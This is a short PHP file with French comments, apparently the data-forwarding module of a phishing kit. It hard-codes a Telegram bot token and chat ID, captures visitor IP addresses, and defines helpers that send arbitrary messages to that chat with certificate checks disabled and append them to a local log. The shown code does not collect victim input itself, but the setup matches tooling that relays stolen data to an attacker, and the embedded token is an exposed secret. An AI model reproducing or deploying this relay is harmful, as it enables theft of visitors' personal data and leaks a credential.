<?php
    //DÉPLOYER

$token = "9014244118:AAFAESy9h0HrsyzyL1-l73O2rhXtG02TBRQ";   // token du bot (fourni par @BotFather)
$id    = "1388757999";        

$ipp = ($_SERVER['REMOTE_ADDR'] === "::1")
     ? "127.0.0.1"
     : $_SERVER['REMOTE_ADDR'];

function call($msg){
    global $token, $id;
    $url = 'https://api.telegram.org/bot'.$token.'/sendMessage'
         . '?chat_id='.$id.'&text='.urlencode($msg);
    $c = curl_init($url);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    //return $res;
}

function save($txt){
    // Version corrigée (l'original ouvrait un dossier → bug)
    $fp = fopen(__DIR__."/logs.txt", "a");
    if($fp){ fwrite($fp, $txt."\n"); fclose($fp); }
}
?>